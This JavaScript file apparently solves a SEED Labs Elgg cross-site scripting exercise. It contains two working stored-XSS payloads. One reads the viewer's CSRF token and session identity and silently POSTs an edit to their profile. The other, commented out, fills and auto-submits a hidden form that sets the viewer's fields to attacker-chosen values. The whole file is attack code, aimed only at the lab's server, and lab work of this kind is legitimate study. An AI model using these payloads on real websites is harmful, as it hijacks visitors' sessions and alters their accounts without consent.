// Approach 2
window.onload = function(){
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var name="&name="+elgg.session.user.name;
    var description="&description=1905113";
    var briefdescription="&briefdescription=briefdescription_set_by_1905113";
    var location="&location=location_set_by_1905113";
    var interests="&interests=interests_set_by_1905113";
    var skills="&skills=skills_set_by_1905113";
    var contactemail="&contactemail=1905113@example.com";
    var phone="&phone=+1234567890";
    var mobile="&mobile=+1905113";
    var website="&website=www.1905113.com";
    var twitter="&twitter=twitter_set_by_1905113";
    var guid="&guid="+elgg.session.user.guid;
	var content=token+ts+name+description+briefdescription+location+interests+skills+contactemail+phone+mobile+website+twitter+guid; //FILL IN
	var owner_id=elgg.page_owner.guid;
	var visitor_id=elgg.session.user.guid;
	
	if(owner_id!=visitor_id)
	{
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}


// Approach 1
{/* <form id="profileEditForm" method="post" action="http://www.seed-server.com/action/profile/edit" enctype="multipart/form-data">
   <fieldset>
       <input name="__elgg_token" value="InDZpUJXaivA-1An05fmlA" type="hidden" />
       <input name="__elgg_ts" value="1707405869" type="hidden" />
       <input value="" name="name" maxlength="50" id="elgg-field-j30oys" type="hidden" />
       <input value="" type="hidden" name="briefdescription" id="profile-briefdescription" />
       <input value="" autocapitalize="off" type="hidden" name="location" id="profile-location" />
       <input value="" autocapitalize="off" type="hidden" name="interests" id="profile-interests" />
       <input value="" autocapitalize="off" type="hidden" name="skills" id="profile-skills" />
       <input autocapitalize="off" autocorrect="off" type="hidden" name="contactemail" value="" id="profile-contactemail" />
       <input value="" type="hidden" name="phone" id="profile-phone" />
       <input value="" type="hidden" name="mobile" id="profile-mobile" />
       <input value="" autocapitalize="off" autocorrect="off" type="hidden" name="website" id="profile-website" />
       <input value="" type="hidden" name="twitter" id="profile-twitter" />
       <input name="guid" value="59" type="hidden" />
       <textarea rows="10" cols="50" id="profile-description" name="description" style="display: none;" data-editor-opts='{"disabled":false,"state":"visual","required":null}'></textarea>

   </fieldset>
</form>
<script type="text/javascript">
window.onload = function () {
	var Ajax=null;
	var ts=elgg.security.token.__elgg_ts;
	var token=elgg.security.token.__elgg_token;
	var id=elgg.session.user.guid;
    var uid=elgg.page_owner.guid;
    var uurl=elgg.page_owner.url;
    var name=elgg.session.user.name;
    var tokenInput=document.querySelector('input[name="__elgg_token"]');
    var tsInput=document.querySelector('input[name="__elgg_ts"]');
    var useridInput=document.querySelector('input[name="guid"]');
    var briefdescriptionInp=document.querySelector('input[name="briefdescription"]');
    var descriptionInp=document.querySelector('textarea[name="description"]');  
    var twitInp=document.querySelector('input[name="twitter"]');
    var webInp=document.querySelector('input[name="website"]');
    var mobileInp=document.querySelector('input[name="mobile"]');
    var phoneInp=document.querySelector('input[name="phone"]');
    var contactemailInp=document.querySelector('input[name="contactemail"]');
    var skillsInp=document.querySelector('input[name="skills"]');
    var interestsInp=document.querySelector('input[name="interests"]');
    var locationInp=document.querySelector('input[name="location"]');
    var nameInp=document.querySelector('input[name="name"]');
    descriptionInp.InnerHTML="1905113";
    nameInp.value=name;
    locationInp.value="location_set_by_attacker";
    interestsInp.value="interests_set_by_attacker";
    skillsInp.value="skills_set_by_attacker";
    contactemailInp.value="attacker@example.com";
    phoneInp.value="+1234567890";
    mobileInp.value="1905113";
    webInp.value="www.attacker.com";
    twitInp.value="twitter_set_by_attacker";
    tokenInput.value=token;
    tsInput.value=ts;
    useridInput.value=id;
    briefdescriptionInp.value="briefdescription_set_by_attacker";
    var form=document.getElementById('profileEditForm');
    if (id!=uid){
        form.submit();
    }
}
</script> */}
